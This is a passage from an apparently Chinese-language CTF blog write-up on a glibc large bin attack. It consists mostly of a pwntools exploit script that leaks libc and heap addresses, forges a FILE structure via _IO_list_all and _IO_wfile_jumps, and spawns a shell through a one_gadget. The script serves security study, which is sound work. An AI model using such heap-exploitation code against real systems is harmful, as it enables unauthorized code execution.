class="string">&quot;\x1b[&#123;code&#125;m&#123;x&#125;\x1b[0m&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def menu(index):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def add(index, size):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;input your index&#x27;</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;input your size&#x27;</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def edit(index, content):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;input your index&#x27;</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;nput your content&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(index):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;input your index&#x27;</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;input your index&#x27;</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">ogg = [<span class="number">0x50a47</span>, <span class="number">0xebc81</span>, <span class="number">0xebc85</span>, <span class="number">0xebc88</span>, <span class="number">0xebce2</span>, <span class="number">0xebd3f</span>, <span class="number">0xebd43</span>]</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x510</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,b<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x21ace0</span></span><br><span class="line"><span class="built_in">log</span>.success(xilker(f<span class="number">&#x27;l</span>ibc_base--&gt;&#123;hex(libc_base)&#125;<span class="string">&#x27;))</span></span><br><span class="line"><span class="string">add(3, 0x550)  # chunk0申请回来了,为了把chunk0从unsortbin放入到largebin中</span></span><br><span class="line"><span class="string">edit(0, &#x27;</span>a<span class="string">&#x27; * 0x10)</span></span><br><span class="line"><span class="string">show(0)</span></span><br><span class="line"><span class="string">p.recvuntil(b&#x27;</span>a<span class="string">&#x27; * 0x10)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">heap_base = u64(p.recv(6).ljust(8, b&#x27;</span>\x00<span class="string">&#x27;)) - 0x290</span></span><br><span class="line"><span class="string">log.success(xilker(f&#x27;</span>heap_base--&gt;&#123;hex(heap_base)&#125;<span class="string">&#x27;))</span></span><br><span class="line"><span class="string">_IO_list_all = libc_base + libc.sym[&#x27;</span>_IO_list_all<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">_IO_wfile_jumps = libc_base + libc.sym[&#x27;</span>_IO_wfile_jumps<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">_IO_stdfile_2_lock = libc_base + 0x21ca60</span></span><br><span class="line"><span class="string">ogg = libc_base + ogg[1] </span></span><br><span class="line"><span class="string">system_addr = libc_base + libc.sym[&#x27;</span>system<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">target = libc_base + 0x21ace0  # main_arena + 86</span></span><br><span class="line"><span class="string">log.success(xilker(f&#x27;</span>IO--&gt;&#123;hex(target)&#125;<span class="string">&#x27;))</span></span><br><span class="line"><span class="string">free(2) # chunk2作为攻击块</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 准备large bin attack</span></span><br><span class="line"><span class="string">p1 = p64(0) + p64(target) + p64(heap_base + 0x290) + p64(_IO_list_all - 0x20)</span></span><br><span class="line"><span class="string">edit(0, p1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">add(4, 0x550)</span></span><br><span class="line"><span class="string">heap_addr = heap_base + 0x550 + 0x500 + 0x290  </span></span><br><span class="line"><span class="string">target_addr = heap_base + 0x550 + 0x500 + 0x290 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p2 = b&#x27;</span>\x00&#x27;</span><br><span class="line">p2 = p2.ljust(<span class="number">0x18</span>, b<span class="string">&#x27;\x00&#x27;</span>) + p64(<span class="number">1</span>)</span><br><span class="line">p2 = p2.ljust(<span class="number">0x90</span>, b<span class="string">&#x27;\x00&#x27;</span>) + p64(heap_addr + <span class="number">0xe0</span>)</span><br><span class="line">p2 = p2.ljust(<span class="number">0xc8</span>, b<span class="string">&#x27;\x00&#x27;</span>) + p64(_IO_wfile_jumps)</span><br><span class="line">p2 = p2.ljust(<span class="number">0xd0</span> + <span class="number">0xe0</span>, b<span class="string">&#x27;\x00&#x27;</span>) + p64(target_addr + <span class="number">0xe0</span> + <span class="number">0xe8</span>)</span><br><span class="line">p2 = p2.ljust(<span class="number">0xd0</span> + <span class="number">0xe8</span> + <span class="number">0x68</span>, b<span class="string">&#x27;\x00&#x27;</span>) + p64(ogg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, p2)</span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;exit\n&quot;</span> , b<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xilker2237.github.io">Xilker</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xilker2237.github.io/2025/10/23/large%20bin%20attack/">https://xilker2237.github.io/2025/10/23/large%20bin%20attack/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://xilker2237.github.io" target="_blank">Xilker's Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/blog_card_picture/5.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/10/27/FMC%E9%80%86%E5%90%91/" title=""><img class="cover" src="/blog_card_picture/2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post" loading='lazy'><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2"></div></div><div class="info-2"><div class="info-item-1">拿到FMC的逆向题目先用xspy观察一下这个题目窗口，可以发现最下面的OnCommand窗口，检测出id为03e9。同时给出了ida中函数的地址，这里就可以推测这里存在着题目的check逻辑  去花脚本 找到if判断的函数，往下走可以进入correct的分支，则证明上面存在检查逻辑      函数 作用    sub_483880 管理内部字符串对象，写时拷贝 + 引用计数   sub_482600 读取输入字符串并验证是否为正确 flag &#x2F; key &#x2F; 密码，其中包含复杂的字符映射验证逻辑    进入482600函数后接着往下找到sub_482AF0函数，这里判断了输入的字符串是否为38，且去除了flag开头和尾部。同时反转了整个字符串  动调可以看到这一部分在实现rc4的密钥生成流  在这里进行异或后的字符串与密文判断  去花脚本 1234567891011121314from ida_bytes import get_bytes, patch_bytesimport readdr = 0x402600end = 0x402ae3buf = get_by...</div></div></div></a><a class="pagination-related" href="/2025/10/21/%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B/" title="高校网络安全管理运维赛"><img class="cover" src="/blog_card_picture/3.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post" loading='lazy'><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">高校网络安全管理运维赛</div></div><div class="info-2"><div class="info-item-1">Phishing 一开始就看到一个奇怪的程序，不知道什么作用，先留着  根据题目描述和文件结构，是一个针对游戏用户的钓鱼攻击：  攻击者诱导用户打开 helpme.chm 帮助文件，然后 CHM文件执行恶意代码，最后 释放DLL文件进行劫持攻击  1hh.exe -decompile extracted helpme.chm  先解压这个chm文件，然后会得到一个html文件test.html文件包含恶意JavaScript代码： 123456789101112&lt;head&gt;&lt;script type=&quot;text/javascript&quot;&gt;function command() &#123;  var command = &quot;echo AAAAABogAAAAUgABAAEAAAAABgVLUA...（Base64数据）... &gt; reversed.zip&quot;;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body onload=&quot;command()&quot;&gt;&lt;h1&...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="author-info-name">Xilker</div><div class="author-info-description">自律源于热爱</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xiler2237"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/xiler2237" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:your-email@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到 Xilker's Blog！自律源于热爱。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#large-bin-attack"><span class="toc-number">1.</span> <span class="toc-text">large bin attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#large-bin-attack%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">large bin attack原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90%EF%BC%9A2024%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9B"><span class="toc-number">1.2.</span> <span class="toc-text">题目解析：2024年强网拟态初赛</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99-IO-list-all-0x20%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.2.1.</span> <span class="toc-text">写 _IO_list_all - 0x20的原因</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/02/13/SHCTF-xilker-wp/" title="SHCTF二进制部分全解wp"><img src="/blog_card_picture/5.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SHCTF二进制部分全解wp"/ loading='lazy'></a><div class="content"><a class="title" href="/2026/02/13/SHCTF-xilker-wp/" title="SHCTF二进制部分全解wp">SHCTF二进制部分全解wp</a><time datetime="2026-02-13T03:08:25.000Z" title="发表于 2026-02-13 11:08:25">2026-02-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/26/Reverse%E6%89%8B%E6%90%93%E8%84%9A%E6%9C%AC%E7%AF%87/" title="Reverse手搓脚本篇"><img src="/blog_card_picture/3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Reverse手搓脚本篇"/ loading='lazy'></a><div class="content"><a class="title" href="/2025/12/26/Reverse%E6%89%8B%E6%90%93%E8%84%9A%E6%9C%AC%E7%AF%87/" title="Reverse手搓脚本篇">Reverse手搓脚本篇</a><time datetime="2025-12-26T08:27:10.000Z" title="发表于 2025-12-26 16:27:10">2025-12-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/23/ISCTF%E9%A2%98%E8%A7%A3/" title="ISCTF二进制部分wp"><img src="/blog_card_picture/1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ISCTF二进制部分wp"/ loading='lazy'></a><div class="content"><a class="title" href="/2025/11/23/ISCTF%E9%A2%98%E8%A7%A3/" title="ISCTF二进制部分wp">ISCTF二进制部分wp</a><time datetime="2025-11-23T13:32:34.000Z" title="发表于 2025-11-23 21:32:34">2025-11-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/29/fmt%E6%BC%8F%E6%B4%9E/" title="无标题"><img src="/blog_card_picture/4.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无标题"/ loading='lazy'></a><div class="content"><a class="title" href="/2025/10/29/fmt%E6%BC%8F%E6%B4%9E/" title="无标题">无标题</a><time datetime="2025-10-29T09:12:28.380Z" title="发表于 2025-10-29 17:12:28">2025-10-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/27/FMC%E9%80%86%E5%90%91/" title="无标题"><img src="/blog_card_picture/2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无标题"/ loading='lazy'></a><div class="content"><a class="title" href="/2025/10/27/FMC%E9%80%86%E5%90%91/" title="无标题">无标题</a><time datetime="2025-10-27T07:12:38.400Z" title="发表于 2025-10-27 15:12:38">2025-10-27</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Xilker</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.0-b1</a></span></div><div class="footer_custom_text">Powered <a href="https://hexo.io" target="_blank">Hexo</a>,Hosted <a href="https://vercel.com" target="_blank">Vercel</a> | Hosted <a href="https://www.cloudflare.com" target="_blank">Cloudflare</a>,CDN BY <a href="https://www.jsdelivr.com" target="_blank">jsDelivr</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script src="/js/title.js"></script><script src="/js/runtime.js"></script><script src="/js/random.js"></script><script src="/js/post-card-bg.js"></script><script src="/js/card-click.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/chart.js@3.9.1/dist/chart.min.js"></script><script src="/js/tag-chart.js"></script><script src="/js/category-chart.js"></script><script src="/js/busuanzi-index.js"></script></div></body></html>
